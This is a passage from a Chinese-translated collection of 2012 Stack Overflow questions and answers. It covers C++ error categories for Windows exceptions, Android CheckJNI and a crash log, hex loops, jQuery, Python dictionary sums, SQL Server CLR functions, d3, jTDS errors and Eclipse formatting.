EXCEPTION_ILLEGAL_INSTRUCTION = ?
EXCEPTION_IN_PAGE_ERROR = ?
EXCEPTION_INT_DIVIDE_BY_ZERO = ?
EXCEPTION_INT_OVERFLOW = value_too_large perhaps, but then what do I use for _STACK_OVERFLOW?
EXCEPTION_INVALID_DISPOSITION = ?
EXCEPTION_INVALID_HANDLE = ? 
EXCEPTION_NONCONTINUABLE_EXCEPTION = ? 
EXCEPTION_PRIV_INSTRUCTION = ?
EXCEPTION_SINGLE_STEP = ?
EXCEPTION_STACK_OVERFLOW = value_too_large perhaps, but then what do I use for _INT_OVERFLOW? 
```

那么攻击这个的最好方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:17:45.267

First as commented by @JamesMcNellis some of this exceptions are very dangerous and it may be better to let OS handle them and terminate your program, since those errors are usually an error in your code. But may be you want to handle them and write something like a crash report possibly with a dump of stack and registers.

Beside that `std::error_condition` and `std::error_code` is not designed to only work with `POSIX` errors. Their structure is designed in a way that can handle any case that an `int` value that is equal to 0 indicate a success and otherwise an error, so you may write a completely valid code that use them with `std::error_code` and `std::error_condition` but you should drive a class from `std::error_category` and implement its virtual functions to provide explanation of your error codes that matched with your error codes(in your case NT status codes):

```
class NT_status_code_error_category : std::error_category {
public:
    const char* name() const {return "NT status code";}
    std::string message( int errCode ) const {
        switch( errCode ) {
        case EXCEPTION_ACCESS_VIOLATION: return "Access violation";
        // a couple of other error codes will be handled here
        default: return "Unknown status code";
        }
    }
    std::error_condition default_error_condition( int errCode ) const {
    return std::error_condition( errCode, *this );
}
};
inline NT_status_code_error_category const& NT_status_code_category() {
    static NT_status_code_error_category res;
    return res;
}

inline std::error_code make_NT_status_error_code( int status ) {
    return std::error_code( status, NT_status_code_category() );
}
inline std::error_condition make_NT_status_error_condition( int status ) {
    return std::error_condition( status, NT_status_code_category() );
} 
```

# android - 是否可以在无根的普通 android 设备上启用 checkjni？

> ID：13093577
> 
> 赞同：0
> 
> 时间：2012-10-26T19:57:15.213
> 
> 标签：android, android-ndk, java-native-interface, device, adb

我想在我的 android 设备上启用 checkjni。但是，我无法设置 stackoverflow 中给出的属性，因为它们使用“su”或“root”。

我不能在没有 root 访问权限的设备上启用 checkjni 吗？当我使用设备时，我想在 logcat 上看到“checkJNI ON”

更新：当我解锁我的音轨播放应用程序的屏幕时，我从设备上得到了这些。我怎样才能扩展细节？我想启用每个 checkjni 选项。这个块什么也没告诉我，或者是吗？

```
10-26 20:47:16.720: A/libc(18272): Fatal signal 11 (SIGSEGV) at 0x00000078 (code=1)

10-26 20:47:17.145: W/SurfaceView(2094): CHECK surface infomation creating=false formatChanged=false sizeChanged=false visible=false visibleChanged=true surfaceChanged=true realSizeChanged=false redrawNeeded=false left=false top=false
10-26 20:47:17.145: I/SurfaceFlinger(1903): id=1615 Removed SurfaceView idx=4 Map Size=6
10-26 20:47:17.145: D/KeyguardViewMediator(2094): setHidden false
10-26 20:47:17.145: I/SurfaceFlinger(1903): id=1615 Removed SurfaceView idx=-2 Map Size=6
10-26 20:47:17.150: D/WallpaperWidget(2094): cleanUp()
10-26 20:47:17.150: I/DEBUG(17071):          #00  pc 0007831e  /system/lib/libdvm.so (_Z13dvmImplementsPK11ClassObjectS1_)
10-26 20:47:17.150: I/DEBUG(17071):          #01  pc 000783fa  /system/lib/libdvm.so
10-26 20:47:17.150: I/DEBUG(17071):          #02  pc 00078390  /system/lib/libdvm.so (dvmInstanceofNonTrivial)
10-26 20:47:17.155: D/KeyguardUpdateMonitor(2094): handleClockVisibilityChanged()
10-26 20:47:17.155: I/DEBUG(17071):          #03  pc 00026fcc  /system/lib/libdvm.so (dvmAsmSisterStart)
10-26 20:47:17.155: D/KeyguardViewMediator(2094): adjustStatusBarLocked: mShowing=false mHidden=false isSecure=true --> flags=0x0
10-26 20:47:17.155: I/DEBUG(17071):          #04  pc 000343b0  /system/lib/libdvm.so (_Z12dvmInterpretP6ThreadPK6MethodP6JValue)
10-26 20:47:17.155: I/DEBUG(17071):          #05  pc 0006c8c6  /system/lib/libdvm.so (_Z15dvmInvokeMethodP6ObjectPK6MethodP11ArrayObjectS5_P11ClassObjectb)
10-26 20:47:17.155: I/DEBUG(17071):          #06  pc 00073eba  /system/lib/libdvm.so
10-26 20:47:17.155: I/DEBUG(17071):          #07  pc 00030bcc  /system/lib/libdvm.so
10-26 20:47:17.155: I/DEBUG(17071):          #08  pc 000343b0  /system/lib/libdvm.so (_Z12dvmInterpretP6ThreadPK6MethodP6JValue)
10-26 20:47:17.155: I/DEBUG(17071):          #09  pc 0006cb96  /system/lib/libdvm.so (_Z14dvmCallMethodVP6ThreadPK6MethodP6ObjectbP6JValueSt9__va_list)
10-26 20:47:17.155: D/KeyguardViewMediator(2094): setHidden false
10-26 20:47:17.155: I/DEBUG(17071):          #10  pc 00054ff6  /system/lib/libdvm.so
10-26 20:47:17.155: D/STATUSBAR-StatusBarManagerService(2094): manageDisableList what=0x0 pkg=android
10-26 20:47:17.160: I/DEBUG(17071):          #11  pc 00049a7a  /system/lib/libandroid_runtime.so
10-26 20:47:17.160: I/DEBUG(17071):          #12  pc 0004b362  /system/lib/libandroid_runtime.so (_ZN7android14AndroidRuntime5startEPKcS2_)
10-26 20:47:17.160: I/DEBUG(17071):          #13  pc 00008f0a  /system/bin/app_process
10-26 20:47:17.160: I/DEBUG(17071):          #14  pc 0001684c  /system/lib/libc.so (__libc_init)
10-26 20:47:17.160: I/DEBUG(17071): code around pc:
10-26 20:47:17.160: I/DEBUG(17071): 409a32fc e8bd4648 f1b883fe d1050f02 f8d9e7ee  HF..............
10-26 20:47:17.160: I/DEBUG(17071): 409a330c 6ad93000 d1f32907 f8406938 e7ef9026  .0.j.)..8i@.&...
10-26 20:47:17.160: I/DEBUG(17071): 409a331c 6f82b510 e0072300 f8546fc4 428c4033  ...o.#...oT.3@.B
10-26 20:47:17.160: I/DEBUG(17071): 409a332c 2001d101 3301e003 dbf54293 bd102000  ... ...3.B... ..
10-26 20:47:17.160: I/DEBUG(17071): 409a333c e92d4b1b 447b41f3 460e681b ea864607  .K-..A{D.h.F.F..
10-26 20:47:17.160: I/DEBUG(17071): code around lr:
10-26 20:47:17.160: I/DEBUG(17071): 409a33dc 6c93e004 bf144299 20012000 bf00bd10  ...l.B... . ....
10-26 20:47:17.160: I/DEBUG(17071): 409a33ec 6a09460a 0589b510 d5034603 f7ff4611  .F.j.....F...F..
10-26 20:47:17.160: I/DEBUG(17071): 409a33fc e01cff8f 78086981 d110285b f8906990  .....i.x[(...i..
10-26 20:47:17.160: I/DEBUG(17071): 409a340c f1bcc000 d0050f5b 428a6c99 2000bf14  ....[....l.B... 
10-26 20:47:17.160: I/DEBUG(17071): 409a341c e00c2001 6c196bd8 ffc4f7ff 4293e007  . ...k.l.......B
10-26 20:47:17.160: I/DEBUG(17071): stack:
10-26 20:47:17.160: I/DEBUG(17071):     bede46f8  bede4701  [stack]
10-26 20:47:17.160: I/DEBUG(17071):     bede46fc  409a2b5f  /system/lib/libdvm.so
10-26 20:47:17.160: I/DEBUG(17071):     bede4700  40fa0b80  /dev/ashmem/dalvik-heap (deleted)
10-26 20:47:17.160: I/DEBUG(17071):     bede4704  000000c2  
10-26 20:47:17.160: I/DEBUG(17071):     bede4708  57099d68  /dev/ashmem/dalvik-LinearAlloc (deleted)
10-26 20:47:17.160: I/DEBUG(17071):     bede470c  583a91d4  /system/framework/framework.odex
10-26 20:47:17.160: I/DEBUG(17071):     bede4710  00000000  
10-26 20:47:17.160: I/DEBUG(17071):     bede4714  00000000  
10-26 20:47:17.160: I/DEBUG(17071):     bede4718  01b31468  [heap]
10-26 20:47:17.160: I/DEBUG(17071):     bede471c  01aed2e0  [heap]
10-26 20:47:17.160: I/DEBUG(17071):     bede4720  409def9c  /system/lib/libdvm.so
10-26 20:47:17.160: I/DEBUG(17071):     bede4724  586591ec  /system/framework/framework.odex
10-26 20:47:17.160: I/DEBUG(17071):     bede4728  fffffe4c  
10-26 20:47:17.160: I/DEBUG(17071):     bede472c  4095f740  /system/lib/libdvm.so
10-26 20:47:17.160: I/DEBUG(17071):     bede4730  df0027ad  
10-26 20:47:17.160: I/DEBUG(17071):     bede4734  00000000  
10-26 20:47:17.160: I/DEBUG(17071): #00 bede4738  34000000  
10-26 20:47:17.160: I/DEBUG(17071):     bede473c  409a33ff  /system/lib/libdvm.so
10-26 20:47:17.160: I/DEBUG(17071): #01 bede4740  34000000  
10-26 20:47:17.160: I/DEBUG(17071):     bede4744  409a3395  /system/lib/libdvm.so 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:01:12.377

您应该能够`adb shell setprop debug.checkjni 1`在无根设备上进行操作。它将影响在那之后启动的任何应用程序，并且您应该`D Late-enabling CheckJNI`在启动应用程序时在日志中看到。

# c++ - 循环遍历 hex/prop_id 值

> ID：13093579
> 
> 赞同：1
> 
> 时间：2012-10-26T19:57:31.113
> 
> 标签：c++, hex

我正在用 c++ 编写一个用于 pst 提取的程序。

我想检查所有可能的 prop_ids，我能想到的最好的方法是遍历它们。`prop_id`在 c++ 中，我可以通过调用来声明 a

```
prop_id = 0x0000 
```

我想增加这方面的 0000 。这`prop_id`需要一个十六进制数。我怎样才能增加0000的价值。我试过了

```
prop_id pid = 0x000; 
```

紧随其后的是 pid++ 但这似乎返回了一个 8 位长的十六进制数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:25:17.610

我还是不明白这个问题。也许是因为您对什么是十六进制数字感到困惑。在计算机内部，无论我们以 2（二进制）、8（八进制）、10（十进制）还是 16（十六进制）写入数字，位都是一样的。

所以，拿数字 16... 这些都是一样的：

```
unsigned short pid = 0b10000;  // binary (prefix with '0b' -- GCC only)
unsigned short pid = 020;      // octal (prefix with '0')
unsigned short pid = 16;       // decimal (no prefix)
unsigned short pid = 0x10;     // hexadecimal (prefix with '0x') 
```

要循环，只需执行以下操作：

```
for( int i = 0; i <= 0xffff; i++ ) {
    printf( "%04x = %d\n", i, i );
} 
```

如果使用`unsigned short`（16 位整数），循环时需要小心。如果你`unsigned short`用上面的结构循环 a ，它将永远循环，因为在递增后`0xffff`它会回绕回零。你可以这样做：

```
unsigned short i = 0;
do {
    printf( "%04hx = %hu\n", i, i );
    i++;
} while( i != 0 );  // Will become zero after completing 0xffff iteration. 
```

无论如何，关键是，如果您只是将数字发送到某个函数，那么无论您将它们作为十六进制、十进制还是其他任何方式都没有关系......它们都是一样的。如果您需要输出它，请参阅我的`printf`电话。

# javascript - 使用 jquery 和 html5 更改单击时的背景图像

> ID：13093580
> 
> 赞同：0
> 
> 时间：2012-10-26T19:57:38.303
> 
> 标签：javascript, jquery, html, css, responsive-design

如何使用 jquery 或 java 脚本更改背景图像 onClick？

例如：我有六（6）张图像，当我单击“>”（下一个箭头）时，我想更改为下一个背景图像，并在单击“<”（后退箭头）时更改为上一个背景图像。

我正在使用响应式 html5 和 css3 开发这个网站。

```
<script type="text/javascript" src="jquery-1.8.2.min.js"></script> //jquery inside the folder ok
<script type="text/javascript">                                         
var images = ['url("../images/1366x768/image-_0107.jpg")', 'url("../images/1366x768/image-_0012.jpg")'],  curIndex = 0; // here I set the images inside the desired folder

// Left arrow selector
$('.backarrow').click(function () {   //here I set the back arrow "<" 
    if (curIndex > 0) {
        // Container selector
        $('backgrounds').css('../images/1366x768/image-0061.jpg', images[--curIndex]); // here I set my file backgrounds.css and the default image configured there
    }
});

// Right arrow selector
$('.nextarrow').click(function () {
    if (curIndex < images.length - 1) {
        // Container selector
        $('backgrounds').css('../images/1366x768/image-0061.jpg', images[++curIndex]);
    }
});
</script>

<!--HTML 5 -->

<div id="square"><a href="" class="nextarrow">></a> <!-- here I call my jquery -->
</div>  
<div id="square"><a href="" class="backarrow"><</a> <!-- here I call my jquery -->
</div>

/* CSS3 */

/* backgrounds.css */

body {
    background: #dcd8d5 url(../images/1366x768/image-_0061.jpg) no-repeat center center fixed; -webkit-background-size: cover;
 -moz-background-size: cover; -o-background-size: cover; background-size: cover }

/* default.css */

.nextarrow {
    font-size:20px; color:#666; font-style:normal 
}
.backarrow {
    font-size:20px; color:#666; font-style:normal 
} 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:06:36.333

错误似乎在这一行：

```
$('backgrounds') 
```

你到底想用这个选择什么？如果是一个 id = "backgrounds" 的对象，你应该使用 $('#backgrounds')，如果它是一个类，你可以使用 $('.backgrounds') 来选择它。您使用的方式是，jQuery 正在尝试搜索名为“背景”的元素（即标签）。（我很确定这不是你想要做的）

无论如何，如果你想改变背景图像，比如说，你的身体元素，你应该使用类似的东西：

```
$(document).ready(function() {
    $(".nextarrow").click(function(){
    {
        $('body').css("background-image","url(../images/1366x768/image-0061.jpg)"); //   Correct the path to your image
    } 

} 
```

或者，您可以使用以下方法从 id 恰好是“背景”的元素更改背景图像：

```
$('#backgrounds').css("background-image","url(../images/1366x768/image-0061.jpg)"); // Correct the path relative to the html document this script is running. 
```

我希望它有所帮助。干杯

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:11:44.363

jQuery 方法如下：

```
$("#background").css("background-image","url(img_url_here)"); 
```

我不完全确定您要选择什么，所以我制作了一个 jsfiddle，希望能让您更容易弄清楚：

[JSFiddle](http://jsfiddle.net/rcKV6/)

# python - 如何在 Python 3 中计算字典中的每组值？

> ID：13093583
> 
> 赞同：1
> 
> 时间：2012-10-26T19:57:45.137
> 
> 标签：python, dictionary, counting

我有一个字典，在多个键下有多个值。我不想要单个值的总和。我想找到一种方法来找到每个键的总和。该文件是制表符分隔的，标识符是其中两项的组合，Btarg。每个标识符都有多个值。
这是一个测试文件： 这是一个测试文件，所需的结果如下：

图案项目丰度

1 蚂蚁 2

2 狗 10

3 长颈鹿 15

1 蚂蚁 4

2 狗 5

这是预期的结果：

图案1蚂蚁，6

图案2狗，15

Pattern3长颈鹿，15

这是我到目前为止所拥有的：

```
for line in K:

    if "pattern" in line:
        find = line
        Bsplit = find.split("\t")
        Buid = Bsplit[0]
        Borg = Bsplit[1]
        Bnum = (Bsplit[2])
        Btarg = Buid[:-1] + "//" + Borg

        if Btarg not in dict1:
            dict1[Btarg] = []
        dict1[Btarg].append(Bnum)
    #The following used to work
    #for key in dict1.iterkeys():
        #dict1[key] = sum(dict1[key])
    #print (dict1) 
```

如何在 Python 3 中完成这项工作而不会出现错误消息“+: 'int' 和 'list' 不支持的操作数类型？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:01:41.043

利用`from collections import Counter`

从[文档](http://docs.python.org/library/collections.html#collections.Counter)中：

```
c = Counter('gallahad')
Counter({'a': 3, 'l': 2, 'h': 1, 'g': 1, 'd': 1}) 
```

回应你的评论，现在我想我知道你想要什么，虽然我不知道你的数据在什么结构中。我会理所当然地认为你可以像这样组织你的数据：

```
In [41]: d
Out[41]: [{'Ant': 2}, {'Dog': 10}, {'Giraffe': 15}, {'Ant': 4}, {'Dog': 5}] 
```

首先创建一个defaultdict

```
from collections import defaultdict
a = defaultdict(int) 
```

然后开始计算：

```
In [42]: for each in d:
            a[each.keys()[0]] += each.values()[0] 
```

结果：

```
In [43]: a
Out[43]: defaultdict(<type 'int'>, {'Ant': 6, 'Giraffe': 15, 'Dog': 15}) 
```

**更新 2**

假设您可以以这种格式获取数据：

```
In [20]: d
Out[20]: [{'Ant': [2, 4]}, {'Dog': [10, 5]}, {'Giraffe': [15]}]

In [21]: from collections import defaultdict

In [22]: a = defaultdict(int)

In [23]: for each in d:
    a[each.keys()[0]] =sum(each.values()[0])
   ....:     

In [24]: a
Out[24]: defaultdict(<type 'int'>, {'Ant': 6, 'Giraffe': 15, 'Dog': 15}) 
```

# sql - 从 SQL Server 2008 中选择函数列表时，Routine_body=External 但所有其他数据为 NULL

> ID：13093585
> 
> 赞同：2
> 
> 时间：2012-10-26T19:58:10.760
> 
> 标签：sql, sql-server, sql-server-2008

我试图在 3 个不同的数据库中获取用户定义函数的列表和定义，以组合成一个数据库。

我有列出 3 个用户定义函数的 select 语句，但是当我运行它时，该`ROUTINE_BODY`列显示`'EXTERNAL'`but`EXTERNAL_NAME`和`EXTERNAL_LANGUAGE`is `NULL`（以及`ROUTINE_DEFINITION`它应该是`EXTERNAL`例程的哪个）。

```
SELECT * 
FROM INFORMATION_SCHEMA.ROUTINES 
WHERE ROUTINE_TYPE = 'FUNCTION' 
```

这给了我数据库、例程名称以及我需要的一切，除了函数的实际定义。任何人都可以帮助我了解 SQL Server 可能在哪里存储函数的 SQL 吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:04:07.140

您需要使用`object_definition`系统功能

```
select specific_name, object_definition(object_id(specific_name))
from INFORMATION_SCHEMA.ROUTINES 
where routine_type = 'FUNCTION' 
```

**更新：**好的，所以这不是你想要的。我刚刚错过了您需要定义 CLR 函数而不是标准的用户定义函数。实际上，我有一对可以帮助你的脚本。您可以使用它们获取 CLR 函数的参数，然后组合您需要的脚本

```
select 
    O.[object_id] as System_Object_ID,
    A.Name as Assembly_Name,
    ASM.assembly_class as Assembly_Class,
    ASM.assembly_method as Assembly_Method,
    case
        when ASM.execute_as_principal_id is null then 'CALLER'
        else PR.name
    end as Execute_As_Name
from sys.assembly_modules as ASM with (nolock)
    inner join sys.assemblies as A with (nolock) on A.[assembly_id] = ASM.[assembly_id]
    inner join sys.objects as O with (nolock) on O.[object_id] = ASM.[object_id]
    left outer join sys.schemas as S with (nolock) on S.[schema_id] = O.[schema_id]
    left outer join sys.database_principals as PR on PR.principal_id = ASM.execute_as_principal_id

select 
    O.[object_id] as System_Object_ID,
    P.name as Parameter_Name,
    T.name as [Type_Name],
    P.precision as [Precision],
    P.scale as [Scale],
    P.max_length as [Max_Length],
    case
        when P.has_default_value = 1 then isnull(cast(P.default_value as nvarchar(max)), 'null')
        else null
    end as Default_Value,
    P.is_output as Is_Output
from sys.assembly_modules as ASM with (nolock)
    inner join sys.parameters as P with (nolock) on P.[object_id] = ASM.[object_id]
    inner join sys.objects as O with (nolock) on O.[object_id] = ASM.[object_id]
    left outer join sys.schemas as S with (nolock) on S.[schema_id] = O.[schema_id]
    inner join sys.types as T with (nolock) on T.system_type_id = P.system_type_id and T.user_type_id = P.user_type_id 
```

或者，可能更容易，您可以只编写来自 SSMS 的对象的脚本 :)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:05:42.917

这是一个用 .NET 编写的[CLR 函数](http://msdn.microsoft.com/en-us/library/ms131077.aspx)，然后在 SQL Server 中注册。

# javascript - jquery“hasClass（）”不起作用？

> ID：13093592
> 
> 赞同：6
> 
> 时间：2012-10-26T19:58:39.003
> 
> 标签：javascript, jquery

如果另一个 div 有一个类，我需要隐藏一个 div。

我在[这里创建了一个非常基本的示例](http://jsfiddle.net/sC3Yq/1/)

当“点击”这个词被点击时，我需要隐藏底部的 div。它在中间 div 中添加了一个类就好了，但似乎`hasClass()`不想工作？

**注意：**结构需要是这样的。如果点击“click”，修改中间的div（添加类？），根据中间的div来操作底部的div。使用此设置 - 我不能只执行“如果单击 CLICK，则 slideUp() 底部 div”。

此外，一旦单击“确定”或“取消”，它将恢复，因为中间 div 将不再具有该类。如果这是我可以在这里工作的方法，哈哈。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-06-26T15:55:48.767

在旁注中，检查是否有类的另一个变体是：

```
if ( $('body.className').length ) { 
```

不过还是推荐 hasClass。有时很高兴看到变化。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-26T20:06:51.700

您的`if`语句在任何函数之外，因此在加载脚本后没有理由调用它。

[看到这个小提琴](http://jsfiddle.net/9mv6M/)，我想这就是你想要的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-26T20:03:29.590

这只会在脚本加载时被调用一次。您需要确保它在您的`.click(...)`处理程序中被调用。

```
if($('#timestampdiv').hasClass('hidepub')) {
    $('#major-publishing-actions').slideUp('slow');
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-26T20:17:53.597

正如其他人所提到的，您没有调用`if`所有单击事件处理程序。创建一个带有内部语句的自定义函数，`if`并在所有点击处理程序上调用它。

检查这个[小提琴](http://jsfiddle.net/sC3Yq/3/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-26T20:02:15.257

将类附加到 DOM 元素后，这应该会正确隐藏该元素。

```
$('.element').click(function()
{
    $('.thisElement').addClass('hidepub');
    if($('.thisElement').hasClass('hidepub')) {
         $('.thisElement').hide();
    }
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-26T20:16:34.803

您可以将它们全部组合成一个功能-并且您希望该检查位于点击功能内

[您可以通过使用toggleClass](http://api.jquery.com/toggleClass/)并传入条件来减少 addclass removeclass

```
$('a.edit-timestamp,a.save-timestamp,a.cancel-timestamp').click(function() {
    var $tsdiv = $("#timestampdiv");
    // add class showpub if edit is clicked
    $tsdiv.toggleClass('showpub',$(this).hasClass('edit-timestamp'));
    // add class hidepub only if it wasn't edit that was clicked
    $tsdiv.toggleClass('hidepub',!$(this).hasClass('edit-timestamp'));  

    // then do your toggle                            
    if ($tsdiv.hasClass('hidepub')) {
        $('#major-publishing-actions').slideUp('slow');
    }else{
        $('#major-publishing-actions').slideDown('slow');
    }
}); 
```

[http://jsfiddle.net/JPcge/](http://jsfiddle.net/JPcge/)

您可以通过交换传递给 toggleClass() 方法的逻辑来反转它

# android - 触发 IO Android 主题

> ID：13093596
> 
> 赞同：1
> 
> 时间：2012-10-26T19:59:11.657
> 
> 标签：android, trigger.io

有没有办法在触发 android 应用程序中激活本机菜单的全息主题（在我的情况下，是从 AlertDialog 中破解的“ContextMenu”）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T16:57:20.187

我在评论中链接的答案被证明是有效的。

如何在插件中使用它的快速示例：

```
Dialog dialog = new Dialog(new ContextThemeWrapper(ForgeApp.getActivity(), android.R.style.Theme_Holo));
dialog.setTitle("Hello");
dialog.show(); 
```

# algorithm - 查找具有最大总和/元素数的子数组

> ID：13093602
> 
> 赞同：2
> 
> 时间：2012-10-26T19:59:51.810
> 
> 标签：algorithm, matrix

输入：一个由 n 个正负数和一个数 k 组成的数组。

输出：至少有 k 个连续元素的子数组，其中元素的最大总和除以子数组中的元素数。

O(n^2) 算法很简单。有没有人对此有更好的算法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T21:14:54.960

您可以使用二进制搜索。

对于搜索值`x`，请考虑数组`b[i] = a[i] - x`。现在找到长度至少为 的最大和子数组`k`。

这是有效的，因为长度子数组的平均值`k`是`(a[p] + ... + a[p + k - 1]) / k`。所以我们有：

```
(a[p] + ... + a[p + k - 1]) / k >= avg
a[p] + ... + a[p + k - 1] >= avg * k
(a[p] - avg) + ... + (a[p + k - 1] - avg) >= 0 
```

所以，如果你对平均值进行二分搜索，通过从每个元素中减去它，如果你能找到一个长度至少为 的正和子数组（找到最大值并检查它是否为正）`k`，那么`avg`这是一个有效的答案：继续搜索一下`[avg, max_avg]`，看看你能不能找到一个更好的。如果不是，则将搜索减少到`[0, avg]`.

# javascript - 使img不要在html中移动

> ID：13093603
> 
> 赞同：1
> 
> 时间：2012-10-26T19:59:55.343
> 
> 标签：javascript, html, onclick, onmousemove

我的页面上有一张图片，我想在鼠标按下时收听 onmousemove 事件。但我不能，因为在我的浏览器（Firefox）中，当我拖动图像时，实际上我拖动了我不想要的图像。

这是我的代码：

JavaScript 部分：

```
document.onmousemove=getMouseCoordinates;

var x;
var y;
var clicked = false;

function getMouseCoordinates(event){
    ev = event || window.event;
    x = ev.pageX;
    y = ev.pageY;
}

    function onClickMap(){  
        var obj = document.getElementById("selectArea");
        var tempX = x;
        var tempY = y;

    obj.style.left = tempX + "px";
    obj.style.top  = tempY + "px";

    clicked = true;
}

function onMoveMap(){
    if(clicked){
        var obj = document.getElementById("selectArea");
        var xToSize = Math.abs(parseInt(obj.style.left) - x);
        var yToSize = Math.abs(parseInt(obj.style.top)  - y);
        obj.style.width  = xToSize + "px";
        obj.style.height = yToSize + "px";
    }
} 
```

HTML部分：

```
<img src="pixels.png" id ="pixelDiv" usemap="#pixelMap" onClick="onClickMap()" onmousemove="onMoveMap()"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:02:29.127

这是一个 jQuery 解决方案。

这将禁用所有拖动：

```
$(document).bind("dragstart", function() {
     return false;
}); 
```

如果您只想在`img`元素上禁用拖动：

```
$(document).bind("dragstart", function(e) {
     if (e.target.nodeName.toUpperCase() == "IMG") {
         return false;
     }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:03:57.693

您可以添加只返回 false 的 mousedown 处理程序。这似乎停止了 FF 的拖拽。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-27T10:00:37.083

好的，很好，但我想它是特定于 firefox 的，现在我禁用了我的图像的 onlcick 和 onmove 方法，但我仍然可以拖动图像

现在我找到了解决方案，我正在寻找这个

[http://www.develobert.info/2008/10/disable-firefox-image-drag.html](http://www.develobert.info/2008/10/disable-firefox-image-drag.)

# javascript - 无法向我的 d3 条形图添加任何内容

> ID：13093604
> 
> 赞同：0
> 
> 时间：2012-10-26T20:00:04.743
> 
> 标签：javascript, d3.js

[这](http://bl.ocks.org/3961053)是我的条形图的一个简化的、面向公众的版本。我似乎无法添加任何东西。我正在按照[本](http://mbostock.github.com/d3/tutorial/bar-1.html)教程尝试将 x 轴的垂直线和每个条形图内的文本添加到我的图表中，但两者都没有显示。基本上没有真正显示我尝试添加的内容，但我能够添加您可以在 graph.js @ line 65 中看到的 x 轴线。您可以在代码中看到我尝试在图中添加线条的位置 line graph.js 中的 56 个。x 值是任意的，因为我只是想让它们显示出来。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:46:27.343

问题是您的选择器“line”不够具体。文档中已经有 'line' 元素；它们形成轴刻度。

因此，您的代码正在执行以下操作。它选择现有的线元素并将您提供的数据绑定到这些元素。由于这些元素已经存在，因此 enter() 选择将为空。这意味着您的 append("line") 命令将永远不会被执行：

```
 var lines = svg.selectAll("line")
            .data(data)
            .enter().append("line") 
```

您可以通过添加一个类来提供更多的特异性。例如以下应该工作：

```
var lines = svg.selectAll("line.rules")
    .data(data)
  .enter().append("line")
    .attr("class", "rules"); 
```

有关进入、更新和退出选择的更多信息，请参阅 Mike 的文章[Thinking with Joins](http://bost.ocks.org/mike/join/)。

# ruby-on-rails - 构建 Rails CMS 类型的应用程序

> ID：13093608
> 
> 赞同：0
> 
> 时间：2012-10-26T20:00:23.857
> 
> 标签：ruby-on-rails, content-management-system

我刚刚完成了我的第一本书学习 RoR 并想练习更多扩展项目，但我对如何构建我想要做的添加有点茫然，希望得到一些指导。

现在，应用程序由具有控制逻辑的模型和将逻辑路由到视图的控制器的页面分开，但没有任何页面具有任何交叉功能。我想创建一个页面，该页面具有来自其他模型的逻辑的预模板化功能，类似于 WordPress 中的小部件或 Magento 中的插件。如果我有一个 Page 模型并且想要在视图中注入一个 Bestsellers 列表，或者我有一个 Blog 模型并且想要注入一个带有标签的产品列表，该标签已经调用了具有所有标记的模板，那么正确的方法是什么去做这个？

这些必须是模块吗？我是否只需为目录创建另一个视图模板，然后将其调用到页面索引视图中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:44:11.793

[没关系，我在这里](http://guides.rubyonrails.org/layouts_and_rendering.html)找到了我正在寻找的答案

# varchar - jtds TDS 协议错误：数据包类型无效

> ID：13093609
> 
> 赞同：3
> 
> 时间：2012-10-26T20:00:46.740
> 
> 标签：varchar, jtds, sybase-asa

我正在使用 jTDS 库 (v1.2.6) 连接到 Sybase ASA v11.0.1，每次尝试返回 varchar 数据时都会出现以下错误

> 协议错误：数据包类型无效`0x0`

（或`x4`或`x7`）

当我返回时间戳或数值时，查询工作正常。知道是什么导致了这个错误或如何解决它吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-06-07T14:58:13.130

根据此[https://sourceforge.net/p/jtds/discussion/104389/thread/d6e2efe3/，1.2.6似乎不支持 Sybase](https://sourceforge.net/p/jtds/discussion/104389/thread/d6e2efe3/)

但是我有时会在读取结果集时超时关闭连接时看到这一点

# c++ - Eclipse C++ 格式化数组初始化器

> ID：13093612
> 
> 赞同：1
> 
> 时间：2012-10-26T20:01:01.243
> 
> 标签：c++, eclipse, formatting, array-initialization

eclipse 格式化数组初始化器的方式太可怕了。我知道您可以在首选项中调整它的格式，但它总是会在“=”和“{...}”之间添加一个换行符。

这对我来说看起来很丑陋，尤其是当你有一个空的初始化程序时。

有没有办法进一步调整这些设置，使其永远不会换行，或者它只是让数组初始化器单独存在，并且只在初始化器的逗号和元素之间放置适量的空格？

例如，这就是我想要的方式：

```
string shortArray[15] = { };
string notVeryLong[] = { "Some words", "More words", "and more", "etc" };
string TooLongForOneLine[] = 
{
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc", 
    "Some words", "More words", "and more", "etc" 
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T01:07:36.983

我不确定您使用的是哪个版本的 Eclipse，但我会回答 Eclipse 3.7 的问题，因为这是我使用的。

1.  打开“Windows”下拉菜单并选择首选项。
2.  然后导航到“C++”，然后是“代码样式”。
3.  选择“新建...”按钮。提供名称并选择其中一个内置配置文件。
